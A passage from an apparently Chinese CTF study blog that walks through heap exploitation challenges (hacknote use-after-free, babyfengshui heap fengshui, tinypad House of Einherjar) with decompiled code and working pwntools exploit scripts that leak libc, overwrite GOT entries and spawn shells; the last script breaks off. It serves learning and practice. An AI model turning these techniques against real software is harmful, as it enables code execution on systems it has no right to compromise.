atoi(&amp;buf);</span><br><span class="line">        v0 = notelist[i];</span><br><span class="line">        v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_DWORD *)notelist[i] + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content :"</span>);</span><br><span class="line">        read(<span class="number">0</span>, *((<span class="keyword">void</span> **)notelist[i] + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Success !"</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Full"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// delete note</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    free note 和 content. 但是两个指针都没有被设置 nullptr.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)notelist[v1] + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//print note</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">print_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">    (*(<span class="keyword">void</span> (__cdecl **)(<span class="keyword">void</span> *))notelist[v1])(notelist[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// print note content</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">print_note_content</span><span class="params">(<span class="keyword">int</span> a1)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后门函数 .text:08048986</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">magic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"cat flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然是一道 UAF 的例题，要把那个函数指针覆盖为 0x08048986，然后 print_note 触发，要注意到一个 node 的大小是 8，然后可以按如下方式操作：</p><ul><li>申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li><li>申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li><li>释放 note0</li><li>释放 note1</li><li>此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0</li><li>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则</li><li>note2 其实会分配 note1 对应的内存块。</li><li>real content 对应的 chunk 其实是 note0。</li><li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</li></ul><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"aaaa"</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"ddaa"</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="Heap-fengshui-babyfengshui"><a href="#Heap-fengshui-babyfengshui" class="headerlink" title="Heap fengshui - babyfengshui"></a>Heap fengshui - babyfengshui</h3><p>Node 大致是这样的：</p><table><thead><tr><th style="text-align:center">Node</th></tr></thead><tbody><tr><td style="text-align:center">char* dect</td><td></td></tr><tr><td style="text-align:center">char name[0x80-sizeof(char*)]</td><td></td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">char</span> *)(len + users_array[idx]-&gt;dect) &gt;=</span><br><span class="line">    (<span class="keyword">char</span> *)users_array[idx] - <span class="number">4</span> ) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"my l33t defenses cannot be fooled, cya!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个只能判断 node 和 dect 相邻时，dect 不溢出，可以把他们操作成不相邻的，就绕过这个检测了。</p><p>然后这么操作:</p><ol><li>create 三个 0x80 的 node.</li></ol><table><thead><tr><th style="text-align:center">node</th></tr></thead><tbody><tr><td style="text-align:center">top</td><td></td></tr><tr><td style="text-align:center">node[2] 0x80</td><td></td></tr><tr><td style="text-align:center">dect[2] 0x80</td><td></td></tr><tr><td style="text-align:center">node[1] 0x80</td><td></td></tr><tr><td style="text-align:center">dect[1] 0x80</td><td></td></tr><tr><td style="text-align:center">node[0] 0x80</td><td></td></tr><tr><td style="text-align:center">dect[0] 0x80</td><td></td></tr></tbody></table><ol start="2"><li>delete node[0].</li></ol><table><thead><tr><th style="text-align:center">node</th></tr></thead><tbody><tr><td style="text-align:center">top</td><td></td></tr><tr><td style="text-align:center">node[2] 0x80</td><td></td></tr><tr><td style="text-align:center">dect[2] 0x80</td><td></td></tr><tr><td style="text-align:center">node[1] 0x80</td><td></td></tr><tr><td style="text-align:center">dect[1] 0x80</td><td></td></tr><tr><td style="text-align:center">空闲    0x100</td><td></td></tr></tbody></table><ol start="3"><li>再 create 一个 0x100 dect 的 node, 此时 dect 和 node 就不在一起了.</li></ol><table><thead><tr><th style="text-align:center">node</th></tr></thead><tbody><tr><td style="text-align:center">top</td><td></td></tr><tr><td style="text-align:center">node[3] 0x80</td><td></td></tr><tr><td style="text-align:center">node[2] 0x80</td><td></td></tr><tr><td style="text-align:center">dect[2] 0x80</td><td></td></tr><tr><td style="text-align:center">node[1] 0x80</td><td></td></tr><tr><td style="text-align:center">dect[1] 0x80</td><td></td></tr><tr><td style="text-align:center">dect[3] 0x100</td><td></td></tr></tbody></table><ol start="4"><li>用堆溢出进行操作.</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh  = process(<span class="string">'./babyfengshui'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyfengshui'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, name, textLen, content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Action:'</span>, <span class="string">'0'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'size of description:'</span>,str(size))</span><br><span class="line">    sh.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line">    sh.sendlineafter(<span class="string">'text length:'</span>,str(textLen))</span><br><span class="line">    sh.sendafter(<span class="string">'text:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Action:'</span>,<span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Action:'</span>,<span class="string">'2'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,textLen,content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Action:'</span>,<span class="string">'3'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">'text length:'</span>,str(textLen))</span><br><span class="line">    sh.sendafter(<span class="string">'text:'</span>,content)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'chunk0'</span>, <span class="number">0x80</span>, <span class="string">'a'</span> * <span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'chunk1'</span>, <span class="number">0x80</span>, <span class="string">'b'</span> * <span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'chunk2'</span>, <span class="number">0x8</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'chunk3'</span>, <span class="number">0x19c</span>,</span><br><span class="line">       <span class="string">'c'</span> * <span class="number">0x198</span> + p32(elf.got[<span class="string">'free'</span>]))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'description: '</span>)</span><br><span class="line">free_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'free'</span>, free_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 libc 加载地址</span></span><br><span class="line">libc_base   = free_addr - libc.dump(<span class="string">'free'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 free 的 got 表地址为 system 的地址</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">4</span>, p32(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell，相当于 system(heap[2])</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>libc2.26 以上因为有 tcache 机制，使用单项链表维护，先进后出，而且块不会合并。</p><h2 id="2020-2-08"><a href="#2020-2-08" class="headerlink" title="2020-2-08"></a>2020-2-08</h2><h3 id="House-Of-Einherjar-tinypad"><a href="#House-Of-Einherjar-tinypad" class="headerlink" title="House Of Einherjar - tinypad"></a>House Of Einherjar - tinypad</h3><h4 id="回顾-House-Of-Einherjar"><a href="#回顾-House-Of-Einherjar" class="headerlink" title="回顾 House Of Einherjar"></a>回顾 House Of Einherjar</h4><p>两个物理相邻的 chunk 会共享 prev_size 字段，当低地址的 chunk 处于使用状态时，高地址的 chunk 的该字段便可以被低地址的 chunk 使用。因此，我们有希望可以通过写低地址 chunk 覆盖高地址 chunk 的 prev_size 字段。</p><p>在一些特殊大小的堆块中，off by one 不仅可以修改下一个堆块的 prev_size，还可以修改下一个堆块的 PREV_INUSE 比特位。这基本就是 House Of Einherjar 的原理。</p><p>利用条件：</p><ul><li>需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。</li><li>我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址。</li><li>我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li></ul><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-einherjar/2016_seccon_tinypad">题目链接</a></p><p>看代码后可以发现以下几个关键点：</p><ul><li>添加 memo 时，用户申请的 chunk 的大小最大为 256 字节，和 tinypad 前面的未使用的 256 字节恰好一致，所有存在 off by one 漏洞。</li><li>删除时会根据存储 memo 的大小判断 memo 是否在被使用，将相应 memo 大小设置为 0，但是并没有将指针设置为 NULL，有可能会导致 UAF。在程序开头时，就有可能输出一些相关的内容，这里可以泄露基址。</li><li>编辑时 copy 存在 off by one。</li></ul><p>利用基本思路如下：</p><ol><li>利用删除时没有将指针置为 NULL 的 UAF 漏洞，泄漏堆的基地址。</li><li>再次利用 UAF 漏洞泄漏 libc 的基地址。</li><li>利用 house of einherjar 方法在 tinypad 的前 256 字节中伪造 chunk。当我们再次申请时，那么就可以控制 4 个 memo 的指针和内容了。</li><li>这里虽然我们的第一想法可能是直接覆盖 malloc_hook 为 one_gadget 地址，但是，由于当编辑时，程序是利用 strlen 来判读可以读取多少长度，而 malloc_hook 则在初始时为 0。所以我们直接覆盖，所以这里采用其他方法，即修改程序的 main 函数的返回地址为 one_gadget，之所以可以行得通，是因为返回地址往往是 7f 开头的，长度足够长，可以覆盖为 one_gadget。所以我们还是需要泄漏 main 函数的返回地址，由于 libc 中存储了 main 函数 environ 指针的地址，所以我们可以先泄露出 environ 的地址，然后在得知存储 main 函数的返回地址的地址。这里选取 environ 符号是因为 environ 符号在 libc 中会导出，而像 argc 和 argv 则不会导出，相对来说会比较麻烦一点。</li><li>最后修改 main 函数的返回地址为 one_gadget 地址获取 shell。</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'DEBUG'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">tinypad = ELF(<span class="string">"./tinypad"</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">7777</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">"./tinypad"</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">    main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">log.info(<span class="string">'PID: '</span> + str(proc.pidof(p)[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'(CMD)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'a'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(SIZE)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'(CONTENT)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'(CMD)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'e'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(INDEX)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'(CONTENT)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">'Is it OK?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'(CMD)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'d'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(INDEX)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 1. leak heap base</span></span><br><span class="line">    add(<span class="number">0x70</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># idx 0</span></span><br><span class="line">    add(<span class="number">0x70</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># idx 1</span></span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># idx 2</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">2</span>)  <span class="comment"># delete idx 1</span></span><br><span class="line">    delete(<span class="number">1</span>)  <span class="comment"># delete idx 0, idx 0 point to idx 1</span></span><br><span class="line">    p.recvuntil(<span class="string">' # CONTENT: '</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)  <span class="comment"># get pointer point to idx1</span></span><br><span class="line">    heap_base = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x80</span></span><br><span class="line">    log.success(<span class="string">'get heap base: '</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. leak libc base</span></span><br><span class="line">    <span class="comment"># this will trigger malloc_consolidate</span></span><br><span class="line">    <span class="comment"># first idx0 will go to unsorted bin</span></span><br><span class="line">    <span class="comment"># second idx1 will merge with idx0(unlink), and point to idx0</span></span><br><span class="line">    <span class="comment"># third idx1 will merge into top chunk</span></span><br><span class="line">    <span class="comment"># but cause unlink feture, the idx0's fd and bk won't change</span></span><br><span class="line">    <span class="comment"># so idx0 will leak the unsorted bin addr</span></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">' # CONTENT: '</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    unsorted_offset_arena = <span class="number">8</span> + <span class="number">10</span> * <span class="number">8</span></span><br><span class="line">    main_arena = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - unsorted_offset_arena</span><br><span class="line">    libc_base = main_arena - main_arena_offset</span><br><span class="line">    log.success(<span class="string">'main arena addr: '</span> + hex(main_arena))</span><br><span class="line">    log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. house of einherjar</span></span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">'a'</span> * <span class="number">0x18</span>)  <span class="comment"># idx 0</span></span><br><span class="line">    <span class="comment"># we would like trigger house of einherjar at idx 1</span></span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'b'</span> * <span class="number">0xf8</span> + <span class="string">'\x11'</span>)  <span class="comment"># idx 1</span></span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'c'</span> * <span class="number">0xf8</span>)  <span class="comment"># idx 2</span></span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'d'</span> * <span class="number">0xf8</span>)  <span class="comment">#idx 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># create a fake chunk in tinypad's 0x100 buffer, offset 0x20</span></span><br><span class="line">    tinypad_addr = <span class="number">0x602040</span></span><br><span class="line">    fakechunk_addr = tinypad_addr + <span class="number">0x20</span></span><br><span class="line">    fakechunk_size = <span class="number">0x101</span></span><br><span class="line">    fakechunk = p64(<span class="number">0</span>) + p64(fakechunk_size) + p64(fakechunk_addr) + p64(</span><br><span class="line">        fakechunk_addr)</span><br><span class="line">    edit(<span class="number">3</span>, <span class="string">'d'</span> * <span class="number">0x20</span> + 